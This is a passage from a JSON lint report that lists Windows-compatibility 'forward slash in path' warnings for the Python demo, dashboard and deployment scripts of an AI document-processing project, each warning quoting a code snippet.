        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\launch_ultimate_demo.py",
        "warning": "Line 286: Forward slash in path - \": str(self.demo_root)\n            }\n        }\n        \n        report_file = self.demo_root / f\"",
        "timestamp": "2025-09-05T17:30:42.160953"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\launch_ultimate_demo.py",
        "warning": "Line 329: Forward slash in path - \"\n    [GUIDE] AI Document Intelligence Platform Demo Guide\n    ===================================================\n    \n    [COMPONENTS] Demo Components:\n    \n    [MAIN] Ultimate Demo (Port 8501) - RECOMMENDED START\n    * Comprehensive system overview\n    * Live document processing\n    * Multi-stakeholder dashboards\n    * Real-time ROI calculations\n    * Best for: All audiences, first demonstrations\n    \n    [CALC] Business Calculator (Port 8505)\n    * Interactive ROI calculator\n    * Scenario modeling and comparison\n    * Sensitivity analysis\n    * Financial projections\n    * Best for: CFOs, finance teams, budget committees\n    \n    [VIZ] Agent Visualization (Port 8504)\n    * 3D agent network visualization\n    * Swarm intelligence animations\n    * Real-time performance metrics\n    * Emergent behavior analysis\n    * Best for: Technical teams, AI enthusiasts\n    \n    [BENCH] Benchmark Showcase (Port 8503)\n    * Performance comparisons\n    * Competitive analysis\n    * Technical deep dives\n    * Historical trends\n    * Best for: Technical evaluations, RFPs\n    \n    [PRES] Interactive Presentation (Port 8502)\n    * Professional slide presentation\n    * Board-ready format\n    * Audience-specific views\n    * Navigation controls\n    * Best for: Board meetings, investor presentations\n    \n    [TIPS] Tips for Success:\n    * Start with Ultimate Demo for comprehensive overview\n    * Use Business Calculator for financial stakeholders\n    * Multi-screen setup: Main demo + specialized views\n    * Have stable internet connection\n    * Use Chrome browser for best performance\n    \n    [AUDIENCE] Audience Recommendations:\n    * CEOs/Executives: Ultimate Demo -> Market Position\n    * CFOs/Finance: Business Calculator -> Custom ROI\n    * CTOs/Technical: Agent Visualization -> Benchmarks\n    * COOs/Operations: Ultimate Demo -> Live Processing\n    \n    [SUPPORT] Support:\n    * Check demo_setup_guide.md for detailed instructions\n    * Review presentation scripts in scripts/ directory\n    * Use sample documents in samples/ directory\n    \"",
        "timestamp": "2025-09-05T17:30:42.161000"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 1: Forward slash in path - \"\nAI Document Intelligence Platform - Ultimate Demo\nThe most impressive, comprehensive demonstration showcasing our complete system\n\nFeatures:\n- Multi-Domain Processing: 96.2% accuracy, 7+ document types, $0.03/document\n- Enterprise API: 25+ endpoints, multi-tenant, ERP integrations\n- BI Dashboard: Real-time 3D analytics, $282K+ ROI tracking\n- Advanced Coordination: Swarm intelligence, competitive selection, meta-learning\n- Total Value: $615K annual savings potential at enterprise scale\n\"",
        "timestamp": "2025-09-05T17:30:42.161754"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 144: Forward slash in path - '%{text}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.161866"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 368: Forward slash in path - \"\n        \n        monthly_savings = documents_per_month * (current_cost_per_doc - ai_cost_per_doc)\n        annual_savings = monthly_savings * 12\n        \n        # Additional benefits\n        error_reduction_savings = documents_per_month * 12 * 0.50  # $0.50 per error prevented\n        time_savings_value = time_savings_hours * 75  # $75/hour average\n        \n        total_annual_value = annual_savings + error_reduction_savings + time_savings_value\n        \n        # Payback calculation\n        implementation_cost = 125000  # One-time setup\n        monthly_subscription = 15000   # Platform fees\n        annual_operating_cost = monthly_subscription * 12\n        \n        net_annual_benefit = total_annual_value - annual_operating_cost\n        payback_months = implementation_cost / (net_annual_benefit / 12)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.162084"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 397: Forward slash in path - \": (net_annual_benefit / implementation_cost) * 100,\n            \"",
        "timestamp": "2025-09-05T17:30:42.162114"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 411: Forward slash in path - \"\n    <style>\n    .main-header {\n        background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);\n        padding: 2rem;\n        border-radius: 10px;\n        color: white;\n        text-align: center;\n        margin-bottom: 2rem;\n    }\n    .metric-card {\n        background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);\n        padding: 1rem;\n        border-radius: 10px;\n        color: white;\n        text-align: center;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n    .demo-section {\n        background: rgba(255, 255, 255, 0.05);\n        padding: 1rem;\n        border-radius: 10px;\n        border: 1px solid rgba(255, 255, 255, 0.1);\n        margin: 1rem 0;\n    }\n    </style>\n    \"",
        "timestamp": "2025-09-05T17:30:42.162147"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 441: Forward slash in path - \">\n        <h1>🚀 AI Document Intelligence Platform</h1>\n        <h2>Ultimate Enterprise Demo - Transforming Document Processing</h2>\n        <p>96.2% Accuracy | $0.03/Document | $615K Annual Savings Potential</p>\n    </div>\n    \"",
        "timestamp": "2025-09-05T17:30:42.162183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 516: Forward slash in path - \"]\n                for i, stage in enumerate(stages):\n                    time.sleep(0.8)  # Simulate processing time\n                    progress_bar.progress((i + 1) / len(stages))\n                    accuracy = random.uniform(0.92, 0.99)\n                    status_text.text(f\"",
        "timestamp": "2025-09-05T17:30:42.162246"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 554: Forward slash in path - \"Speed (docs/min)\"",
        "timestamp": "2025-09-05T17:30:42.162283"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 577: Forward slash in path - \"{((savings/traditional_cost)*100):.1f}% reduction\"",
        "timestamp": "2025-09-05T17:30:42.162317"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 683: Forward slash in path - ']/12:,.0f}\"",
        "timestamp": "2025-09-05T17:30:42.162426"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 768: Forward slash in path - \"1000/min\"",
        "timestamp": "2025-09-05T17:30:42.162493"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 768: Forward slash in path - \"800/min\"",
        "timestamp": "2025-09-05T17:30:42.162516"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 768: Forward slash in path - \"600/min\"",
        "timestamp": "2025-09-05T17:30:42.162539"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 768: Forward slash in path - \"700/min\"",
        "timestamp": "2025-09-05T17:30:42.162566"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 768: Forward slash in path - \"500/min\"",
        "timestamp": "2025-09-05T17:30:42.162592"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 820: Forward slash in path - \"1000/min\"",
        "timestamp": "2025-09-05T17:30:42.162644"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 820: Forward slash in path - \"500/min\"",
        "timestamp": "2025-09-05T17:30:42.162672"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 820: Forward slash in path - \"100/min\"",
        "timestamp": "2025-09-05T17:30:42.162696"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 820: Forward slash in path - \"200/min\"",
        "timestamp": "2025-09-05T17:30:42.162724"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 820: Forward slash in path - \"50/min\"",
        "timestamp": "2025-09-05T17:30:42.162753"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 831: Forward slash in path - \"**SAP**: Full S/4HANA integration with real-time sync\"",
        "timestamp": "2025-09-05T17:30:42.162789"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 1150: Forward slash in path - \"150 docs/min\"",
        "timestamp": "2025-09-05T17:30:42.162973"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 1150: Forward slash in path - \"+45 docs/min\"",
        "timestamp": "2025-09-05T17:30:42.163046"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 1168: Forward slash in path - \"1000+ req/sec\"",
        "timestamp": "2025-09-05T17:30:42.163100"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Line 1186: Forward slash in path - \"< 50/day\"",
        "timestamp": "2025-09-05T17:30:42.163145"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 238: Forward slash in path - ') as f:\n                    config_data = yaml.safe_load(f)\n            else:\n                config_data = {}\n            \n            # Create deployment configuration\n            self.deployment_config = DeploymentConfig(\n                environment=DeploymentEnvironment(environment),\n                deployment_strategy=DeploymentStrategy.CLOUD_NATIVE if target_agents > 100 else DeploymentStrategy.SINGLE_NODE,\n                cpu_cores=max(8, target_agents // 100),\n                memory_gb=max(32, target_agents // 20),\n                max_processes=max(16, target_agents // 50),\n                min_instances=max(1, target_agents // 200),\n                max_instances=max(10, target_agents // 50),\n                enable_ha=environment == \"",
        "timestamp": "2025-09-05T17:30:42.164170"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 556: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.164373"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 557: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.164393"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 558: Forward slash in path - \"/status\"",
        "timestamp": "2025-09-05T17:30:42.164412"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 559: Forward slash in path - \"/business\"",
        "timestamp": "2025-09-05T17:30:42.164432"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "warning": "Line 560: Forward slash in path - \"/evolution\"",
        "timestamp": "2025-09-05T17:30:42.164451"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 114: Forward slash in path - \"\n    \n    def __init__(self, \n                 update_interval_seconds: int = 10,\n                 metrics_retention_hours: int = 24,\n                 enable_web_interface: bool = True):\n        \n        self.update_interval = update_interval_seconds\n        self.metrics_retention_hours = metrics_retention_hours\n        self.enable_web_interface = enable_web_interface and WEB_FRAMEWORK_AVAILABLE\n        \n        # Connected systems for monitoring\n        self.monitored_systems: Dict[str, Any] = {}\n        \n        # Metrics storage\n        self.metrics_history: deque = deque(maxlen=int(metrics_retention_hours * 3600 / update_interval_seconds))\n        self.current_metrics: Optional[SystemMetrics] = None\n        \n        # Alert system\n        self.alert_rules: Dict[str, AlertRule] = {}\n        self.active_alerts: Dict[str, Alert] = {}\n        self.alert_history: deque = deque(maxlen=1000)\n        \n        # Web interface\n        self.app: Optional[FastAPI] = None\n        self.websocket_connections: List[WebSocket] = []\n        \n        # Background tasks\n        self.background_tasks: set = set()\n        self.shutdown_event = asyncio.Event()\n        \n        # Dashboard state\n        self.dashboard_start_time = datetime.now()\n        self.total_metrics_collected = 0\n        self.total_alerts_generated = 0\n        \n        # Initialize default alert rules\n        self._initialize_default_alert_rules()\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.165397"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 577: Forward slash in path - \"\n        total_seconds = int(td.total_seconds())\n        hours = total_seconds // 3600\n        minutes = (total_seconds % 3600) // 60\n        seconds = total_seconds % 60\n        \n        if hours > 0:\n            return f\"",
        "timestamp": "2025-09-05T17:30:42.165683"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 648: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.165760"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 652: Forward slash in path - \"/api/metrics\"",
        "timestamp": "2025-09-05T17:30:42.165781"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 658: Forward slash in path - \"/api/alerts\"",
        "timestamp": "2025-09-05T17:30:42.165802"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 662: Forward slash in path - \"/api/status\"",
        "timestamp": "2025-09-05T17:30:42.165822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 672: Forward slash in path - \"/ws\"",
        "timestamp": "2025-09-05T17:30:42.165848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 689: Forward slash in path - \"\n        <!DOCTYPE html>\n        <html>\n        <head>\n            <title>Autonomous Intelligence Monitoring</title>\n            <style>\n                body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n                .container { max-width: 1200px; margin: 0 auto; }\n                .header { text-align: center; background: #2c3e50; color: white; padding: 20px; border-radius: 8px; }\n                .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }\n                .metric-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n                .metric-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #2c3e50; }\n                .metric-value { font-size: 24px; font-weight: bold; color: #3498db; }\n                .alert { background: #e74c3c; color: white; padding: 10px; margin: 5px 0; border-radius: 4px; }\n                .status-healthy { color: #27ae60; }\n                .status-warning { color: #f39c12; }\n                .status-critical { color: #e74c3c; }\n            </style>\n        </head>\n        <body>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.165885"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 710: Forward slash in path - \">\n                    <h1>🤖 Autonomous Intelligence Ecosystem</h1>\n                    <h2>Real-Time Monitoring Dashboard</h2>\n                </div>\n                \n                <div id=\"",
        "timestamp": "2025-09-05T17:30:42.165911"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 715: Forward slash in path - \">\n                    <p>Loading dashboard...</p>\n                </div>\n            </div>\n            \n            <script>\n                // WebSocket connection for real-time updates\n                const ws = new WebSocket('",
        "timestamp": "2025-09-05T17:30:42.165935"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 722: Forward slash in path - ');\n                \n                ws.onmessage = function(event) {\n                    const data = JSON.parse(event.data);\n                    updateDashboard(data);\n                };\n                \n                // Initial load\n                fetch('",
        "timestamp": "2025-09-05T17:30:42.165959"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 741: Forward slash in path - \">System Health</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.165989"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 742: Forward slash in path - \">\n                                        ${metrics.overall_health.toUpperCase()}\n                                    </div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166013"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 748: Forward slash in path - \">Success Rate</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166037"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 749: Forward slash in path - \">${(metrics.success_rate * 100).toFixed(1)}%</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166061"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 753: Forward slash in path - \">Response Time</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166085"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 754: Forward slash in path - \">${metrics.response_time_ms.toFixed(1)} ms</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166110"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 758: Forward slash in path - \">ROI Achievement</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166134"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 759: Forward slash in path - \">${metrics.roi_percentage.toFixed(0)}%</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166159"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 763: Forward slash in path - \">Autonomous Success</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 764: Forward slash in path - \">${(metrics.autonomous_success_rate * 100).toFixed(1)}%</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166208"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 768: Forward slash in path - \">Reasoning Accuracy</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166232"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 769: Forward slash in path - \">${(metrics.reasoning_accuracy * 100).toFixed(1)}%</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166257"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 773: Forward slash in path - \">Evolution Active</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166282"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 774: Forward slash in path - '}</div>\n                                </div>\n                                \n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166307"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 778: Forward slash in path - \">Processes Automated</div>\n                                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.166332"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 779: Forward slash in path - \">${metrics.processes_automated}</div>\n                                </div>\n                            </div>\n                            \n                            <p><strong>Last Updated:</strong> ${new Date(metrics.timestamp).toLocaleString()}</p>\n                        `;\n                    }\n                }\n                \n                function getHealthClass(health) {\n                    if (health === '",
        "timestamp": "2025-09-05T17:30:42.166360"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 791: Forward slash in path - ';\n                }\n                \n                // Refresh every 10 seconds\n                setInterval(() => {\n                    fetch('",
        "timestamp": "2025-09-05T17:30:42.166388"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\monitoring_dashboard.py",
        "warning": "Line 796: Forward slash in path - ')\n                        .then(response => response.json())\n                        .then(data => updateDashboard(data));\n                }, 10000);\n            </script>\n        </body>\n        </html>\n        \"",
        "timestamp": "2025-09-05T17:30:42.166414"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
        "warning": "Line 400: Forward slash in path - \"  {agent_name}: {passed}/{total} validations passed\"",
        "timestamp": "2025-09-05T17:30:42.167040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
        "warning": "Line 470: Forward slash in path - \"Temporal reasoning: 10 tasks in {temporal_duration:.3f}s ({10/temporal_duration:.1f} tasks/s)\"",
        "timestamp": "2025-09-05T17:30:42.167107"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
        "warning": "Line 481: Forward slash in path - \"Memory storage: 20 operations in {memory_duration:.3f}s ({20/memory_duration:.1f} ops/s)\"",
        "timestamp": "2025-09-05T17:30:42.167125"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\comprehensive_system_demo.py",
        "warning": "Line 494: Forward slash in path - \"Orchestration: 15 tasks in {orchestration_duration:.3f}s ({15/orchestration_duration:.1f} tasks/s)\"",
        "timestamp": "2025-09-05T17:30:42.167145"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 39: Forward slash in path - ',\n    handlers=[\n        logging.StreamHandler(),\n        logging.FileHandler(script_dir / '",
        "timestamp": "2025-09-05T17:30:42.167555"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 376: Forward slash in path - ', 0) for a in auction_results) / len(auction_results)\n                }\n            else:\n                auction_result = await task_allocator.demo_operation(\n                    '",
        "timestamp": "2025-09-05T17:30:42.167851"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 803: Forward slash in path - ']) / len(failure_responses)\n                results['",
        "timestamp": "2025-09-05T17:30:42.168244"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 912: Forward slash in path - ', 0.7) for r in degradation_results) / len(degradation_results)\n                    results['",
        "timestamp": "2025-09-05T17:30:42.168370"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 1010: Forward slash in path - ': len(batch_tasks) / batch_processing_time\n                }\n            else:\n                batch_result = await performance_tuner.demo_operation(\n                    '",
        "timestamp": "2025-09-05T17:30:42.168490"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 1357: Forward slash in path - ': successful_demos / total_demos if total_demos > 0 else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.168767"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 1371: Forward slash in path - ', 0) for demo in self.demo_results.values()\n                ) / len(self.demo_results) if self.demo_results else 0,\n                '",
        "timestamp": "2025-09-05T17:30:42.168840"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 1382: Forward slash in path - \"\n        report_file = script_dir / '",
        "timestamp": "2025-09-05T17:30:42.168909"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\demo_phase6_ecosystem.py",
        "warning": "Line 1465: Forward slash in path - \"\n    demo = Phase6EcosystemDemo()\n    \n    try:\n        # Run complete demonstration\n        results = await demo.run_complete_demonstration()\n        \n        # Save detailed results\n        results_file = script_dir / '",
        "timestamp": "2025-09-05T17:30:42.169030"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
